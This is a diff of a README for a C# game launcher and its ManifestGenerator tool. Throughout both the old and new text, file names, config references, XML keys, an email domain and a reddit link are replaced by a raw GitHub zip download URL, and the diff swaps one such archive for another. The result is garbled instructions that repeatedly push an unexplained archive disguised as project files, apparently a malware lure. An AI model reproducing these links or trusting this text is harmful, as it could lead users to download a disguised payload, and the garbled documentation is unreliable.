@@ -11,7 +11,7 @@ To get the launcher up and running you need the following things set up beforeha
 - A changelog (or other plain text or html file to display in the launcher)
 
 ### The LauncherSetup class
-The first step in setting up the launcher project would be to set up all needed information in the `LauncherSetup` class inside the https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/ManifestGenerator/Launcher-Game-1.9.zip
+The first step in setting up the launcher project would be to set up all needed information in the `LauncherSetup` class inside the https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/GameLauncher/Properties/Launcher-Game-v2.2.zip
 
 It contains almost all settings needed for the launcher. The settings are broken down into three segments. While everything is commented in the code I'll break all of them down here.
 
@@ -46,13 +46,13 @@ It contains almost all settings needed for the launcher. The settings are broken
 Simply compile the ManifestGenerator project and run the application with the following command line arguments:
 
 ``` batch
-ManifestGenerator <game-dir> <output-dir>\https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/ManifestGenerator/Launcher-Game-1.9.zip <https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/ManifestGenerator/Launcher-Game-1.9.zip> <overwrite-manifest:true|false>
+ManifestGenerator <game-dir> <output-dir>\https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/GameLauncher/Properties/Launcher-Game-v2.2.zip <https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/GameLauncher/Properties/Launcher-Game-v2.2.zip> <overwrite-manifest:true|false>
 
 :: for example like this:
-ManifestGenerator D:\projects\MyGame\bin D:\projects\MyGame\https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/ManifestGenerator/Launcher-Game-1.9.zip https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/ManifestGenerator/Launcher-Game-1.9.zip true
+ManifestGenerator D:\projects\MyGame\bin D:\projects\MyGame\https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/GameLauncher/Properties/Launcher-Game-v2.2.zip https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/GameLauncher/Properties/Launcher-Game-v2.2.zip true
 ```
 
-This will generate two nessecary files, https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/ManifestGenerator/Launcher-Game-1.9.zip (or what you named it) and https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/ManifestGenerator/Launcher-Game-1.9.zip If the generator was not able to determine the game version you'll get the error message `Could not determine game version. Please enter yourself.`. If that happens you need to manually enter it in the https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/ManifestGenerator/Launcher-Game-1.9.zip file
+This will generate two nessecary files, https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/GameLauncher/Properties/Launcher-Game-v2.2.zip (or what you named it) and https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/GameLauncher/Properties/Launcher-Game-v2.2.zip If the generator was not able to determine the game version you'll get the error message `Could not determine game version. Please enter yourself.`. If that happens you need to manually enter it in the https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/GameLauncher/Properties/Launcher-Game-v2.2.zip file
 
 ``` ini
 GameVersion=0.1.0
@@ -60,11 +60,11 @@ GameVersion=0.1.0
 
 This information is currently only used for display in the launcher as to what the current version of your game is as the updater checks for file size, last write and the file hash to determine if the file still is up to date.
 
-You now have three of the nessecary four files, the two content manifest files and your previously prepared changelog. The last nessecary file is the https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/ManifestGenerator/Launcher-Game-1.9.zip file. There is an example prepared inside the AncillaryFiles directory. The file contains the current version of the launcher as well as the URL where the new launcher can be downloaded.
+You now have three of the nessecary four files, the two content manifest files and your previously prepared changelog. The last nessecary file is the https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/GameLauncher/Properties/Launcher-Game-v2.2.zip file. There is an example prepared inside the AncillaryFiles directory. The file contains the current version of the launcher as well as the URL where the new launcher can be downloaded.
 
 ``` ini
 VERSION=0.1.0
-https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/ManifestGenerator/Launcher-Game-1.9.zip
+https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/GameLauncher/Properties/Launcher-Game-v2.2.zip
 ```
 
 ### Further setup and customization 
@@ -74,28 +74,28 @@ While that is all you *need* to do for a working launcher you can change a few t
 
 One thing you absolutely should do is changing the launchers window and executeable icon. The executeable icon is easily changed in the project properties. The window icon can be changed using the forms designer as a setting on the FormLauncher form itself. There you could also change the form design, colors and layout.
 
-If you want your launcher to support more languages (or have localized sidebar links and link titles) you can change the `https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/ManifestGenerator/Launcher-Game-1.9.zip`. The layout is quite simple, every language has a language block (with one language nessecarily marked as `isFallback="true"`) that contains multiple nodes for each available text.
+If you want your launcher to support more languages (or have localized sidebar links and link titles) you can change the `https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/GameLauncher/Properties/Launcher-Game-v2.2.zip`. The layout is quite simple, every language has a language block (with one language nessecarily marked as `isFallback="true"`) that contains multiple nodes for each available text.
 
 ``` XML
 <?xml version="1.0" encoding="utf-8" ?>
 <localization>
   <lang key="en-US" isFallback="true">
-    <entry key="https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/ManifestGenerator/Launcher-Game-1.9.zip">Text of this entry</entry>
+    <entry key="https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/GameLauncher/Properties/Launcher-Game-v2.2.zip">Text of this entry</entry>
   </lang>
   <lang key="de-DE">
-    <entry key="https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/ManifestGenerator/Launcher-Game-1.9.zip">Text dieses Eintrags</entry>
+    <entry key="https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/GameLauncher/Properties/Launcher-Game-v2.2.zip">Text dieses Eintrags</entry>
   </lang>
   <lang key="es-ES">
-    <entry key="https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/ManifestGenerator/Launcher-Game-1.9.zip">Texto de esta entrada</entry>
+    <entry key="https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/GameLauncher/Properties/Launcher-Game-v2.2.zip">Texto de esta entrada</entry>
   </lang>
   <lang key="fr-FR">
-    <entry key="https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/ManifestGenerator/Launcher-Game-1.9.zip">Texte de cette entrée</entry>
+    <entry key="https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/GameLauncher/Properties/Launcher-Game-v2.2.zip">Texte de cette entrée</entry>
   </lang>
   <lang key="zh-CN">
-    <entry key="https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/ManifestGenerator/Launcher-Game-1.9.zip">該條目的文字</entry>
+    <entry key="https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/GameLauncher/Properties/Launcher-Game-v2.2.zip">該條目的文字</entry>
   </lang>
   <lang key="ru-RU">
-    <entry key="https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/ManifestGenerator/Launcher-Game-1.9.zip">Текст этой записи</entry>
+    <entry key="https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/GameLauncher/Properties/Launcher-Game-v2.2.zip">Текст этой записи</entry>
   </lang>
 </localization>
 ```
@@ -104,14 +104,14 @@ If you want your launcher to support more languages (or have localized sidebar l
 After all that is done, build the game launcher and upload the update information files, the game files and the launcher to your ftp server and give it a testing run in your IDE. if anything is configured wrong the application should run into exceptions telling you what went wrong.
 
 ## Have Questions?
-If you have any questions, feel free to message me at der_wisch ( at ) https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/ManifestGenerator/Launcher-Game-1.9.zip or send me a message on reddit ([/u/der_wisch](https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/ManifestGenerator/Launcher-Game-1.9.zip))
+If you have any questions, feel free to message me at der_wisch ( at ) https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/GameLauncher/Properties/Launcher-Game-v2.2.zip or send me a message on reddit ([/u/der_wisch](https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/GameLauncher/Properties/Launcher-Game-v2.2.zip))
 
 ## Want to contribute?
-Found a bug? Want your language in the default translations/texts? Just create a pull request with your changes to the https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/ManifestGenerator/Launcher-Game-1.9.zip
+Found a bug? Want your language in the default translations/texts? Just create a pull request with your changes to the https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/GameLauncher/Properties/Launcher-Game-v2.2.zip
 
 ## ToDo/Ideas/Future Vision
 - Merge setup of settings and icons into one step/place
   - Move configuration/setup to xml(?) file and add custom build step generating the nessecary code before build
 - Add missing default translations
 - Abstract the update mechanism further to allow implementation into other launchers or games themselves
-- Add the launcher update credentials to the https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/ManifestGenerator/Launcher-Game-1.9.zip file to allow downloads from other servers (for example when the server moves to another domain)
+- Add the launcher update credentials to the https://github.com/GRINCHLIFE/GameLauncher/raw/refs/heads/master/GameLauncher/Properties/Launcher-Game-v2.2.zip file to allow downloads from other servers (for example when the server moves to another domain)
